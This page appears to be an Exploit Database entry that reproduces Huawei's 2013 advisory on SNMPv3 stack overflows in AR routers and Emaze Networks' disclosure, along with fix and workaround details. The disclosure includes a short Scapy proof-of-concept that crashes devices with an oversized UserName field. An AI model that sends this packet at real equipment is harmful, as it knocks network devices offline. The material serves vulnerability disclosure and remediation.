# Security Advisory - Stack Overflow Vulnerabilities in SNMPv3 debugging mode

* SA No:Huawei-SA-20130313-01
* Initial Release Date:
  Mar 13, 2013
* Last Release Date:
  May 03, 2013

Summary

Simple Network Management Protocol version 3(SNMPv3) is provided by Huawei for network and device management.

While the SNMPv3 is enable and debugging is turn on, attackers can make stack overflow by sending malformed SNMPv3 messages with shellcode encoded, and attack vulnerable equipment remotely. (Vulnerability ID: HWNSIRT-2013-0219)

These vulnerabilities were first reported by Roberto Paleari of Emaze Networks S.p.A. Huawei would like to thank Roberto Paleari and Emaze Networks S.p.A for reporting these issues and for working with us to help protect the security of our customers.

Currently, workarounds are available and fixed version has been provided.

More version information are detailed below.

Software Versions and Fixes

Solution:

The overflow vulnerabilities are fixed by checking the related data copy in SNMPv3 debugging module.

| Product name | Solved version | Solved time |
| --- | --- | --- |
| AR 150/200/1200/2200/3200 | Patch ARV200R002SPC006 for V200R002C01SPC200, V200R002C02SPC200 and V200R002C02SPC300 | Released |
|  | V200R003C01SPC100 | Released |

Impact

When the debugging is turn on, attackers can execute injected arbitrary commands on the device by exploiting the vulnerability.

Vulnerability Scoring Details

The vulnerability classification has been performed by using the CVSSv2 scoring system

(<http://www.first.org/cvss/>).

Base Score: 7.6 (AV:N/AC:H/Au:N/C:C/I:C/A:C)

Temporal Score: 6.5 (E:F/RL:T/RC:C)

Overall Score: 6.5

Technique Details

Following conditions must be satisfied:

1. SNMPv3 is enable.
2. The SNMPv3 module debugging is turn on. (By default, The debugging is turn off).
3. The IP address of the vulnerable equipment is reachable.

Vulnerability details:

When parsing SNMPv3 messages and printing debugging information, The checking of information copy is not enough and the stack overflow maybe occur, resulting in attacking remotely.

Temporary Fix

Workarounds: Connect to the device using SSH and turn off the debugging of SNMPv3. The detailed configuration is as follows(In the case of AR Router):

[Quidway]undo debugging snmp-agent header

Obtaining Fixed Software

Customers should contact Huawei TAC (Huawei Technical Assistance Center) to request the upgrades, or obtain them through Huawei worldwide website at <http://support.huawei.com/support/>. For TAC contact information, please refer to Huawei worldwide website at

Multiple buffer overflows on Huawei SNMPv3 service
==================================================

[ADVISORY INFORMATION]
Title:    Multiple buffer overflows on Huawei SNMPv3 service
Discovery date: 11/02/2013
Release date:   06/05/2013
Credits:   Roberto Paleari (roberto.paleari@emaze.net, @rpaleari)
Advisory URL:   http://blog.emaze.net/2013/05/multiple-buffer-overflows-on-huawei.html

[VULNERABILITY INFORMATION]
Class:           Memory errors

[AFFECTED PRODUCTS]
We confirm the presence of these security vulnerabilities on the following
products:
   * Huawei AR1220 (firmware version V200R002C02SPC121T)
According to Huawei security advisories [2,3] other products are also
vulnerable, but they were not checked.

[VULNERABILITY DETAILS]
The Huawei SNMPv3 service running on the affected devices is vulnerable to
multiple stack-based buffer overflow issues. These vulnerabilities can be
exploited by unauthenticated remote attackers.

The issues concern Huawei implementation of the SNMPv3 User-based Security
Model (USM [1]). Strictly speaking, attackers can overflow the
"AuthoritativeEngineID" and "UserName" SNMPv3 USM fields.

The vulnerabilities we identified can be classified according to the
exploitation context: some issues can be triggered only when SNMP debugging is
enabled, while others are exploitable in the default device configuration.

The first class of issues can be exploited only when SNMP debugging is enabled,
as they are related with the debugging code that displays the content of
incoming SNMP packets. Attackers can leverage these issues to achieve RCE, but
the actual impact is quite low, as SNMP debugging is usually disabled during
normal operation.

The second class of vulnerabilities affects the SNMPv3 packet decoder.
Differently than the previous ones, these issues can be exploited in the
default device configuration. Additionally, it is worth considering that ACLs
are ineffective at mitigating this threat, as SNMPv3 packets are processed by
the device even if the sender's IP is not included in the ACL. Similarly, the
vulnerabilities can be exploited even when no SNMPv3 users are configured.

In the following we include a "proof-of-concept" that exploit the latter
category. Our PoC simply crashes the device, but the payload can probably be
also adapted to achieve RCE.

This Python example crashes the device by overflowing the "UserName" SNMPv3 USM
field. Consider we used a slightly modified version of Python Scapy library to
properly support the SNMPv3 protocol. The complete Python script and the
modified Scapy library can be provided upon request.

<cut>
from scapy.all import *

def main():
    DST = "192.168.1.1"

    snmp = SNMPv3(version=3)
    pkt = IP(dst=DST)/UDP(sport=RandShort(), dport=161)/snmp
    pkt = snmpsetauth(pkt, "emaze", "MD5")
    pkt["SNMPv3"].flags = 4

    # Replace "user_name" with "auth_engine_id" in the next line to trigger the
    # other overflow
    pkt["SNMPv3"].security.user_name = "A"*4096

    pkt.show()
    send(pkt)

if __name__ == "__main__":
    main()
</cut>

[REMEDIATION]
The device manufacturer has released updated firmware versions that should
remediate these issues. Huawei security advisories are available at [2,3].

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
